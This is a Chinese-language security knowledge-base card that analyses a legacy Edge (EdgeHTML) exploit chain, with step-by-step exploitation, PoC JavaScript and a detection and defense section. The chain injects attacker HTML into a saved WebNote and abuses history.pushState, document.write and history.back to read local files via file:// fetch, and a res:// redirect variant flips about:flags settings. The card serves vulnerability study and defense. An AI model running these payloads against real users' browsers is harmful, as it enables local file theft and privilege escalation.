---
id: web-generic-xss-edge-webnote-blob-history-file-origin-spoof-local-file-read
title: Edge WebNote/blob 注入 + history API 伪造文档来源：绕过 file:// 目录限制读取本地文件（含 res:// javascript 目标 EoP 变体）
type: scenario
domain: web
path: web/generic/xss
technique: edge-webnote-blob-history-api-file-origin-spoof-local-file-read
tags:
- xss
- browser
- edge
- edgehtml
- webnote
- blob-url
- history-api
- pushstate
- file-scheme
- local-file-read
- eop
- client-side
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V683
  verified_at: '2026-11-13T13:48:57+08:00'
  notes: 已对照原文与全部15图核对（10-15为WebNote/blob/file链演示，12 blob控制台代码一致）；history.pushState+document.write+history.back伪造file来源与res:// SetExperimentalFlag变体均与原文一致；已按原文订正CVE-2018-0998表述；原文未显式标注受影响版本区间，未设affected_versions；PoC未本机复跑
url: /docs/web/generic/xss/web-generic-xss-edge-webnote-blob-history-file-origin-spoof-local-file-read/
draft: false
kb_aliases:
- Edge WebNote XSS
- blob URL WebNote
- history.pushState file 绕过
- Edge 本地文件泄露
- file:// 同目录限制绕过
- res:// REDIRECT.HTML javascript
- SetExperimentalFlag EoP
- CVE-2019-1356 PoC
---

## 一句话结论

Edge（EdgeHTML）的 WebNote 功能会把用户笔记保存成本地 HTML 文件；攻击者用 `blob:` URL + 窗口导航 + `onblur` 检测，让“保存的 WebNote”内容变成自己的 HTML/JS，从而在 `file:` 上下文执行代码。随后仅用 `history.pushState` + `document.write` + `history.back()` 伪造当前文档在目标目录中的“本地文件”身份，绕过 Edge 对下载/笔记类 HTML 的“只能访问自身目录”限制，用 `fetch('file:///...')` 读取任意本地文件。同一套历史导航技巧还能配合 `res://apds.dll/REDIRECT.HTML?target=javascript:` 在 `res://` 源执行代码并调用 `top.external.SetExperimentalFlag`，修改 `about:flags` 实验设置（EoP）。

## 原理

- **Edge 的 file:// 信任分级（EdgeHTML 行为）**：Edge 认为“用户自己创建的本地 HTML”可访问同机其他位置文件，而“来自互联网/下载/WebNote 的 HTML”被限制在其所在工作目录内。原文示例：
  - `C:\Users\Q\Downloads\malice.html` 不能访问 `C:\a\secret.txt`；
  - WebNote 目录（`...\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\...\WebNotes\malice.html`）下的文件不能访问 `C:\a\secret.txt`；
  - 但 `C:\Users\Q\projects\mywebsite\createdByMe.html` 可以访问 `C:\a\secret.txt`。
  即浏览器对“文件来源的可信度”做了区分，但该判断可被 URL/历史记录操纵。
- **WebNote 的本质**：Edge 的笔记/绘画功能会把当前页面截图存成 WebNote，保存为一个本地 HTML 文件，下次打开 WebNote 就是打开该本地文件。它看起来是浏览器 UI 的一部分，因此用户对“打开 WebNote”的警惕性低于“下载 HTML 再打开”。
- **把攻击者 HTML 塞进 WebNote**：核心是用 `blob:` 文档替换待保存的页面内容：
  1. 攻击页面让用户点击任意位置，用 `window.open('/1.html','qab')` 保留一个窗口引用；
  2. 该窗口/iframe 通过 `URL.createObjectURL(new Blob([...],{type:'text/html'}))` 生成 blob 文档，并用 `history.replaceState('','',blobUrl)` + `location.protocol='blob:http:'` 等在地址栏/历史中伪装；
  3. 用 `window.onblur` 检测用户开始创建 WebNote，并通过 `postMessage` 通知 opener 推进下一步；
  4. 待保存的 WebNote 内容因此变成攻击者构造的 Blob HTML；用户保存后，本地 WebNote 文件里就是攻击者 HTML；
  5. 该 HTML 中根据 `location.protocol == 'file:'` 分支执行恶意代码——即打开保存的 WebNote 时在 `file:` 上下文运行。
  
  前序研究（原文引用）已证明相关入口：CVE-2018-0879（javascript: URI 经 WebNote 执行）、CVE-2018-0998（Edge PDF 预览器内联打开附件；可附带 HTML 文件，但需一次点击）。
- **history API 伪造本地文件身份**：`pushState`/`replaceState` 在 `file:` URI 下也可用，能改写当前文档的 URL，但单纯改 URL 不会改变文档已确定的来源/权限。原文的利用序列是：
  1. `history.pushState('','','file:///C:/a/fictional-non-existent.html')`：把当前文档的 URL 改成目标目录下一个**虚构不存在**的 HTML；
  2. `document.write(...)`：写入一个带 `javascript:` href 的链接/自动点击脚本，其中用 `fetch('file:///C:/a/q.txt',{mode:'no-cors',credentials:'include'})` 读取目标文件；`document.write` 插入的内容在后退后仍保留，是后续“被当成真实文件”的载体；
  3. 再次 `history.pushState('','','file:///C:/a/q.html')`（目标文件位置）；
  4. `history.back()`：回到第 2 步 `document.write` 出来的页面，此时 Edge 把该文档当作位于目标目录的真实本地 HTML，javascript: 代码获得该目录的文件访问权限；
  5. `fetch` 读到 `C:/a/q.txt` 内容并外带（原文用 `alert(escape(q))` 演示）。
  
  即浏览器用文档的历史 URL 关联来判断 file 访问范围，攻击者用“虚构文件 URL + document.write + back”把不可信笔记页伪装成用户目录下的可信本地文件。
- **res:// 源 EoP 变体**：同一历史导航技巧可用于 `res://` 协议。先导航到 `res://apds.dll/REDIRECT.HTML?target=javascript:${payload}`（Lokihardt 在 Edge 利用中用过的内部重定向技巧），payload 里用 `replaceState`/`pushState`/`history.back()` 让 `document.write` 的 `javascript:` iframe 在 `res://` 源执行：
  ```javascript
  history.replaceState("","","res://edgehtml.dll/flags.htm");
  document.write('<iframe src="javascript:top.external.SetExperimentalFlag(/F12ContextMenuEntryPoints/.source, false)">');
  history.pushState('','','res://apds.dll/REDIRECT.HTML?target=javascript:123');
  history.back();
  ```
  最终执行 `top.external.SetExperimentalFlag(...)` 修改 `about:flags` 中的实验开关，原文称此处已获得权限提升。

## 触发条件

- 目标为使用 EdgeHTML 内核、带 WebNote 功能的 Edge 版本（`res://`、`about:flags` 时代）。
- 受害者访问攻击者页面，并发生若干交互：点击页面任意处、创建/保存 WebNote、之后打开保存的 WebNote（原文链需要这些步骤，可用社工/诱导降低感知）。
- 待读取文件位于目标目录（如 `C:/a/`），且浏览器进程有该文件的读取权限。
- `file:` 下的 `pushState`/`replaceState` 未被限制，且 `document.write` 插入的文档在 `history.back()` 后被当作对应 URL 的本地文件。
- res:// 变体还要求该版本允许 `res://apds.dll/REDIRECT.HTML?target=javascript:` 形式并把 `javascript:` 目标在 `res://` 源执行。

## 利用步骤

1. **投递攻击页**：页面显示“点击任意位置”，点击后 `open('/1.html','qab')` 保留窗口引用。
2. **准备 blob 文档**：新窗口内 `a=URL.createObjectURL(new Blob([...],{type:'text/html'}))`，`history.replaceState('','',a.split('/')[3])`，`location.protocol='blob:http:'`，把地址伪装成普通 blob。
3. **检测 WebNote 创建**：注入 `window.onblur=e=>{opener.postMessage("","*",[]);}`；用户点击“添加笔记”时窗口失焦，通知主页面进入下一步。
4. **替换待保存内容**：主页面在消息回调里跳转到已打开的窗口/对应页面；blob 文档内容包含“`location.protocol == 'file:'` 时执行恶意代码，否则继续等待 onblur”的分支，并提示用户保存 WebNote。
5. **保存并重新打开**：用户保存 WebNote，磁盘上的 WebNote HTML 变为攻击者内容；用户再次打开该 WebNote 时，`file:` 分支执行攻击者 JS。
6. **伪造文件身份读文件**：在 `file:` 代码中依次 `pushState` 到目标目录虚构 HTML → `document.write` 插入 `javascript: fetch('file:///C:/a/q.txt',{mode:'no-cors',credentials:'include'}).then(r=>r.text()).then(q=>alert(escape(q)))` → `pushState` 到目标文件 → `history.back()`；读取到本地文件内容并外带。
7. **（变体）res:// EoP**：`location="res://apds.dll/REDIRECT.HTML?target=javascript:${payload}"`，payload 内用相同历史技巧在 `res://` 源执行 `top.external.SetExperimentalFlag(...)`，修改 `about:flags` 设置。

## PoC

原文核心代码（简化，未在本机复跑）：

```javascript
// WebNote 创建检测
a = URL.createObjectURL(new Blob(
  ['Create a WebNote and start drawing something.<script>window.onblur=e=>{opener.postMessage("","*",[]);}<\/script>'],
  {type:'text/html'}));
history.replaceState('','',a.split('/')[3]);
location.protocol = 'blob:http:';

// 保存后的 WebNote 内执行（file: 上下文）
setTimeout(function () {
  history.pushState('', '', 'file:///C:/a/fictional-non-existent.html');
}, 500);
setTimeout(function () {
  document.write("<a id=qa href=\"javascript:try{top.fetch('file:///C:/a/q.txt',{mode:'no-cors',credentials:'include'}).then((q)=>{return q.text()}).then((q)=>{alert(escape(q))});}catch(e){}\">aaaaa</a><script>qa.click()<\/script>");
  history.pushState('', '', 'file:///C:/a/q.html');
  history.back();
}, 1500);
```

res:// EoP 变体（原文）：

```javascript
var qpay = escape`history.replaceState("","","res://edgehtml.dll/flags.htm");
setTimeout(function(){document.write('<iframe src="javascript:top.external.SetExperimentalFlag(/F12ContextMenuEntryPoints/.source, false)">');
history.pushState('','','res://apds.dll/REDIRECT.HTML?target=javascript:123');history.back();},333);`;

location = "res://apds.dll/REDIRECT.HTML?target=javascript:" + qpay;
```

## 变体与关联

- **同类“XSS → 本地文件读取”卡**：[[web-generic-xss-wkhtmltopdf-local-file-read-shadow-login]]（服务端渲染器本地文件读取）、[[web-generic-xss-markdown-viewer-lfi-htpasswd-ssh]]；本卡不同点是不依赖服务端渲染器，而是利用浏览器自身 file:// 来源判定绕过。
- **WebNote 前序入口**：CVE-2018-0879（WebNote 中 javascript: URI 执行）、CVE-2018-0998（PDF 预览器内联打开 HTML 附件）为同一攻击面提供了更简单的“把 HTML 带进 WebNote/本地文件上下文”的方式；原文 PoC 包名为 `CVE-2019-1356.zip`（本地文件泄露 + EoP 两条链），但原文未明确逐条对应 CVE。
- **导航伪造的通用性**：凡是浏览器用“当前 URL/历史记录”决定本地资源访问范围、而 `pushState`/`replaceState` 又允许改写 `file:`/内部协议 URL 的实现，都可能复现；`document.write` + `history.back()` 是让旧内容以新 URL 身份被重新评估的关键。
- **res:// 协议面**：`res://<dll>/REDIRECT.HTML?target=javascript:` 这类内部重定向把 `javascript:` 执行带到 `res://` 源，可触达 `external.*` 等特权 API；与插件/内置页 XSS 组合时是另一类 EoP 入口。

## 检测与防御

- **浏览器侧**：限制 `file:` 文档上的 `pushState`/`replaceState`，或让文件访问权限在文档创建时固定、不随历史 URL 变化；不把 `document.write` 产生的文档按新 URL 重新赋予本地文件权限；WebNote 等“保存为本地 HTML”的功能应把内容放进不透明源（opaque origin），禁止其中脚本访问 file://。
- **功能策略**：企业环境禁用 WebNote/笔记类本地保存功能；对下载/笔记目录的 HTML 执行加强限制（沙箱 iframe、禁用脚本）。
- **用户侧**：不打开来源不明的 WebNote/本地 HTML；浏览器保持更新。
- **检测**：监控本地 HTML（尤其 WebNote 目录）中出现 `blob:` 重定向、`pushState('file:///...')`、`document.write` 与 `fetch('file:///...')` 组合的可疑脚本；检测 `res://apds.dll/REDIRECT.HTML?target=javascript:` 形式的导航；对 Edge 进程读取用户文档目录的异常行为告警。
